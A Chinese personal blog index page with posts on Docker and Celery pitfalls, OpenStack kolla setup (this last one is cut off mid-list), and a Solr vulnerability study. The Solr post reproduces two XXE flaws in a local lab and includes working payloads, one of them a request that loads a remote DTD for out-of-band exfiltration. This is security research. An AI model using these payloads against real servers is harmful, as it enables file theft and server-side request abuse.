<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/blog/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/blog/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/blog/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/blog/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="leveryd个人博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="leveryd个人博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="leveryd个人博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/blog/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>leveryd个人博客</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/blog/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">leveryd个人博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/blog/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/blog/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/blog/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/09/17/docker的坑/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2019/09/17/docker的坑/" itemprop="url">docker开发时踩过的坑</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-17T23:38:00+08:00">
                2019-09-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文记录在使用docker做开发时踩过的一些坑，包括docker工具本身的和在docker中使用其他工具的坑。</p>
<ol>
<li>镜像层数存在限制<pre><code>暂时使用`docker export | import`重新制作新的镜像来解决
</code></pre></li>
<li><p>CMD和ENTRYPOINT区别</p>
<pre><code>报错：docker run -ti ethereum/client-go /bin/sh
正确：docker run -ti --entrypoint=/bin/sh ethereum/client-go
</code></pre></li>
<li><p>pull不到最新的镜像 (超级坑，似乎是镜像层数到了一定数量，就会这样)</p>
<ul>
<li>digest值不一样是肯定的</li>
<li>docker export | import 就解决了</li>
<li>原因还未知，不能复现</li>
</ul>
</li>
<li><p>CMD指令报错</p>
<pre><code>Dockerfile如下：

  FROM busybox
  CMD [&quot;/bin/ls /&quot;]

运行时报如下错误

docker: Error response from daemon: OCI runtime create failed: container_linux.go:345: starting container process caused &quot;exec: \&quot;/bin/ls /\&quot;: stat /bin/ls /: no such file or directory&quot;: unknown.

原因是CMD使用错误，CMD应该为数组`CMD [&quot;/bin/ls&quot;,&quot;/&quot;]`
</code></pre></li>
<li><p>/etc/hosts文件不能覆盖，在dockerfile中无法写入</p>
<pre><code>Dockerfile如下，无法修改/etc/hosts文件
FROM busybox
RUN echo &gt; /etc/hosts
</code></pre></li>
<li><p>内网docker registry login报503错误</p>
<pre><code>原因未知，隔一段时间后再次登陆成功。可能是服务问题
</code></pre></li>
<li><p>脚本在拉取私有仓库时，pull镜像提示找不到</p>
<pre><code>[root@x ~]# docker pull internal.docker.registry/xxx/yyy:latest
Pulling repository internal.docker.registry/xxx/yyy
Error: image xxx/yyy:latest not found

原因：
未登录，坑爹的是私服响应中没有任何提示未登录
解决：
在脚本中每一次pull前docker login
</code></pre></li>
<li><p>cache</p>
<pre><code>Dockerfile如下

  FROM xxx
  pip install --upgrade y
  ...
  CMD [&quot;xxx.sh&quot;]

因为缓存的原因，y依赖包并没有升级

解决办法：将镜像制作分为两部分，不需要缓存的build时添加--no-cache参数。参考1

一行cache改变，接下来的指令都不会缓存
</code></pre></li>
<li><p>pipenv无法安装私有仓库的库</p>
<pre><code>私有仓库因为没有证书，所以没有走https。pip安装的时候可以使用trust-host来使用http协议安装软件，但是pipenv命令行中没有找到类似trust-host的参数。

这个问题属于pipenv的使用问题，只是因为在Dockerfile中用到了pipenv，也就记在这里了。

解决办法：在配置中使用verify_ssl参数，示例配置如下

[[source]]
url = &quot;https://pypi.python.org/simple&quot;
verify_ssl = true
name = &quot;pypi&quot;

[[source]]
url = &quot;http://pypi.home.kennethreitz.org/simple&quot;
verify_ssl = false
name = &quot;home&quot;
</code></pre></li>
<li><p>容器运行一段时间后根目录只读</p>
<pre><code>现象：
https://github.com/moby/moby/issues/18010

应用层奇怪的bug和这个有关，比如代理无法正常工作，是因为没有空间创建证书了。

原因：
内核重新挂载文件系统 grep -B10 &quot;read-only&quot; /var/log/messages.
重新挂载的原因好像是磁盘不够了

解决办法：
删除磁盘中的多余文件，腾出空间
</code></pre></li>
<li><p>docker中python程序日志没有实时输出</p>
<pre><code>现象：
  docker log没有看到python打印的日志，过了一段时间后才能看到
原因：
  存在输出缓冲区
解决方法：
* python -u &lt;script&gt; 禁止python的缓冲区
</code></pre></li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="!https://stackoverflow.com/questions/55619593/bust-cache-bust-within-dockerfile-without-providing-external-build-args">Bust cache bust within Dockerfile without providing external build args</a></li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/07/07/Celery的坑/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2019/07/07/Celery的坑/" itemprop="url">Celery的坑</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-07T22:13:06+08:00">
                2019-07-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Celery-pool选用prefork时多进程-协程的坑"><a href="#Celery-pool选用prefork时多进程-协程的坑" class="headerlink" title="Celery pool选用prefork时多进程+协程的坑"></a>Celery pool选用prefork时多进程+协程的坑</h1><h2 id="坑一：节点和Broker断联"><a href="#坑一：节点和Broker断联" class="headerlink" title="坑一：节点和Broker断联"></a>坑一：节点和Broker断联</h2><p>背景：<br>Celery默认使用多进程提高并发，因为task中多是发送Http请求，所以我采用gevent来提高并发。</p>
<p>代码片段如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from gevent import monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line">@app.task</span><br><span class="line">def poc_call(jsondata):</span><br><span class="line">    ...</span><br><span class="line">    业务代码</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p>
<p>现象：<br>Broker选的是Rabbitmq，打了monkey补丁后，运行一段时间后，在RabbitMQ Management管理页面中查看consumer，发现已经没有Celery节点信息。</p>
<p>原因：<br>猜测原因gevent monkey补丁改变socket库，进而导致基于socket的kombu库异常</p>
<p>验证：</p>
<ol>
<li>注释掉monkey补丁，没有观察到broker断联的情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from gevent import monkey</span><br><span class="line"># monkey.patch_all()</span><br><span class="line"></span><br><span class="line">@app.task</span><br><span class="line">def poc_call(jsondata):</span><br><span class="line">    ...</span><br><span class="line">    业务代码</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>解决方案：</p>
<ol>
<li>在task中创建子进程，在子进程中使用gevent<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from billiard.context import Process</span><br><span class="line"></span><br><span class="line">@app.task</span><br><span class="line">def poc_call(json_data):</span><br><span class="line">    p = Process(target=_poc_call, args=(json_data,))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>需要注意的是开启新进程时，如果使用<code>multiprocess</code>库，会报错<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">File &quot;/data/poc-worker/tasks.py&quot;, line 336, in poc_call</span><br><span class="line">   p.start()</span><br><span class="line"> File &quot;/usr/lib/python2.7/multiprocessing/process.py&quot;, line 124, in start</span><br><span class="line">   &apos;daemonic processes are not allowed to have children&apos;</span><br><span class="line">AssertionError: daemonic processes are not allowed to have children</span><br></pre></td></tr></table></figure></p>
<p>这个问题的解决办法：<br>可以使用<code>billiard</code>库，<code>from billiard.context import Process</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/03/03/Solr漏洞分析（一）-md/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2019/03/03/Solr漏洞分析（一）-md/" itemprop="url">Solr漏洞分析（一）.md</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T19:26:10+08:00">
                2019-03-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>源码版本: lucene-solr-releases-lucene-solr-6.0.0</li>
<li>IDE: IDEA</li>
<li>系统: OSX<h2 id="Ant工具"><a href="#Ant工具" class="headerlink" title="Ant工具"></a>Ant工具</h2></li>
<li><p>Mac安装Ant</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install ant</span><br></pre></td></tr></table></figure>
</li>
<li><p>Ant编译Solr</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ant idea  # 将solr源码编译成intellij idea的项目</span><br><span class="line">ant ivy-bootstrap</span><br><span class="line"></span><br><span class="line">cd solr</span><br><span class="line">ant server # 创建solr server</span><br><span class="line"></span><br><span class="line">ant使用的配置文件一般是build.xml</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>进入<code>lucene-solr\solr\bin</code>文件夹中，运行<code>solr start -p 8988 -f -a &quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988&quot;</code></p>
<p>IDEA中配置<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8988</code></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>只复现两个XXE漏洞</p>
<h2 id="CVE-2017-12629"><a href="#CVE-2017-12629" class="headerlink" title="CVE-2017-12629"></a>CVE-2017-12629</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">solr create -c test  # 创建核心test</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">http://localhost:8988/solr/test/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:4444/executed&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solr-DIH-dataConfig参数XXE漏洞"><a href="#Solr-DIH-dataConfig参数XXE漏洞" class="headerlink" title="Solr DIH dataConfig参数XXE漏洞"></a>Solr DIH dataConfig参数XXE漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">solr create -c test  # 创建核心test</span><br><span class="line"></span><br><span class="line">payload请求：</span><br><span class="line">POST /solr/test/dataimport?_=1551604400819&amp;indent=on&amp;wt=json HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8988</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Origin: http://127.0.0.1:8988</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Referer: http://127.0.0.1:8988/solr/</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 269</span><br><span class="line"></span><br><span class="line">command=full-import&amp;verbose=false&amp;clean=true&amp;commit=true&amp;optimize=false&amp;core=test&amp;dataConfig=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E %3C!DOCTYPE+root+%5B%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2F127.0.0.1:8082%2Fftp_xxe.xml%22%3E%25remote%3B%5D%3E</span><br></pre></td></tr></table></figure>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><ol>
<li><p>没有DataImport功能，界面中报错<code>Sorry, no dataimport-handler defined!</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">http://blog.sina.com.cn/s/blog_4ada05f50102wmkm.html</span><br><span class="line"></span><br><span class="line">https://stackoverflow.com/questions/13913915/org-apache-solr-common-solrexception-error-loading-class-org-apache-solr-handl</span><br><span class="line"></span><br><span class="line">一句话就是需要在核心test的配置文件添加配置，文件配置路径：solr/server/solr/test/conf/solrconfig.xml</span><br><span class="line"></span><br><span class="line">添加如下：</span><br><span class="line">&lt;requestHandler name=&quot;/dataimport&quot; class=&quot;org.apache.solr.handler.dataimport.DataImportHandler&quot;&gt;</span><br><span class="line">  &lt;lst name=&quot;defaults&quot;&gt;</span><br><span class="line">    &lt;str name=&quot;config&quot;&gt;db-data-config.xml&lt;/str&gt;</span><br><span class="line">  &lt;/lst&gt;</span><br><span class="line">&lt;/requestHandler&gt;</span><br><span class="line"></span><br><span class="line">添加后会遇到两个新的问题</span><br><span class="line">1. db-data-config.xml找不到</span><br><span class="line">  解决办法：find lucene-solr-releases-lucene-solr-6.0.0 -name &quot;db-data-config.xml&quot;找到配置文件后，copy过去</span><br><span class="line">2. org.apache.solr.handler.dataimport.DataImportHandler这个类找不到</span><br><span class="line">  解决办法：参考链接，solrconfig.xml配置文件中添加lib包 &lt;lib dir=&quot;$&#123;solr.install.dir:../../../..&#125;/dist/&quot;  regex=&quot;.*dataimporthandler-.*\.jar&quot; /&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>IDEA不支持类的定义的跳转,can not resolve symbol</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. File-&gt;Invalidate Cache</span><br><span class="line"></span><br><span class="line">设置jdk版本为低版本</span><br></pre></td></tr></table></figure>
</li>
<li><p>不能在DocumentBuilderFactory下断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDEA可以在任意异常处下断点，也很容易找到漏洞触发位置</span><br></pre></td></tr></table></figure>
</li>
<li><p>从关键字往回倒时怎么挖？(漏洞作者怎么挖的)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调CoreParser类的parse函数的地方太多了</span><br></pre></td></tr></table></figure>
</li>
<li><p>Solr到底是个什么鬼？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参考 https://www.cnblogs.com/leeSmall/category/1210814.html</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="!http://docs.ioin.in/writeup/xianzhi.aliyun.com/_forum_topic_2177/index.html">敏信审计系列之Apache-solr框架</a></li>
<li><a href="!https://www.jianshu.com/p/4ceeb2c20002">用Intellij idea搭建solr调试环境</a></li>
<li><a href="!https://xz.aliyun.com/t/1523/">Solr XXE &amp; RCE 详细分析（附新的payload）—【CVE-2017-12629】</a></li>
<li><a href="!https://blog.csdn.net/hxxhy/article/details/81029202">Solr DIH dataConfig参数XXE漏洞</a></li>
<li><a href="!https://www.cnblogs.com/leeSmall/category/1210814.html">Solr系列介绍</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2019/02/02/openstack单节点环境搭建/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd个人博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2019/02/02/openstack单节点环境搭建/" itemprop="url">openstack单节点环境搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-02T11:00:00+08:00">
                2019-02-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文记录在安装openstack单节点环境时踩过的一些坑</p>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><h2 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h2><p>因为kolla比DevStack等方式要新一些，故最终选用kolla来安装。而kolla又分下面两种</p>
<ul>
<li>kolla-kubernetes (不如ansible成熟)</li>
<li>kolla-ansible</li>
</ul>
<p>只是入门，就选择使用单点部署</p>
<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><p>ubuntu 14.04 安装测试</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>主要根据参考中的<code>官方文档</code>来搭的环境，需要注意的是，<strong><em>kolla-ansible和kolla两个项目切到origin/stable/queens等稳定版本</em></strong></p>
<p>根据文档安装完成后，可以登陆<code>Horizon dashboard</code>、访问nova等api接口，但是创建虚机还是会报错，留作后面再排错。</p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><ol>
<li><p>build image卡住没有进度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解决方法：添加docker源</span><br><span class="line">/etc/docker/daemon.json</span><br><span class="line">&#123;&quot;registry-mirrors&quot;: [&quot;https://a5aghnme.mirror.aliyuncs.com&quot;]&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR:kolla.common.utils.base:The command &apos;/bin/sh -c yum -y install centos-release-ceph-luminous centos-release-opstools centos-release-qemu-ev epel-release yum-plugin-priorities &amp;&amp; yum clean all &amp;&amp; rm -rf /var/cache/yum&apos; returned a non-zero code: 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>docker-engine和docker.io冲突</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决方法：卸载docker.io</span><br><span class="line">yum remove docker.io docker-common</span><br></pre></td></tr></table></figure>
</li>
<li><p>找不到镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tag 7.0.0 not found in repository docker.io/kolla/centos-binary-cron</span><br><span class="line"></span><br><span class="line">解决方法：修改globals.yml中的配置指定tag</span><br><span class="line"></span><br><span class="line">Dockerhub images are tagged as pike, master, etc. Please set:</span><br><span class="line">openstack_release: &quot;pike&quot; in your globals.yml</span><br></pre></td></tr></table></figure>
</li>
<li><p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error starting daemon: error initializing graphdriver: \&quot;/var/lib/docker\&quot; contains several valid graphdrivers: devicemapper, overlay; Please cleanup or explicitly choose storage driver (-s &lt;DRIVER&gt;)</span><br><span class="line">到/var/lib/docker根据情况，将下面的overlay或者devicemapper文件夹删掉即可。这种情况发生在使用采用dc/os安装后，原有的devicemapper模式修改成了overlay，但是docker同时只能支持一种存储模式。</span><br><span class="line"></span><br><span class="line">不能删除/var/lib/docker/devicemapper 提示device busy时，可以umount /var/lib/docker/devicemapper后再删除</span><br></pre></td></tr></table></figure>
</li>
<li><p>Kolla-build: command not found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ./kolla</span><br></pre></td></tr></table></figure>
</li>
<li><p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://packagecloud.io/grafana/stable/el/7/x86_64/repodata/repomd.xml: [Errno 14] HTTPS Error 302 - Found</span><br></pre></td></tr></table></figure>
</li>
<li><p>docker python库报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load_config() got an unexpected keyword argument</span><br><span class="line"></span><br><span class="line">解决方法：不要按照官方文档安装python-docker-py</span><br><span class="line">pip install &apos;docker&gt;=2.6,&lt;3.0.0&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install ./kolla时报错</span><br><span class="line">Failed to fetch https://packagecloud.io/rabbitmq/rabbitmq-server/ubuntu/dists/xenial/InRelease  Unable to connect to packagecloud-repositories.s3.dualstack.us-west-1.amazonaws.com:https:</span><br><span class="line">INFO:kolla.common.utils.zookeeper:W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br><span class="line"></span><br><span class="line">解决办法：</span><br><span class="line">pip install ./kolla --ignore-installed PyYAML</span><br></pre></td></tr></table></figure>
</li>
<li><p>pip依赖不能重装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cannot uninstall &apos;PyYAML&apos;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署中报错</p>
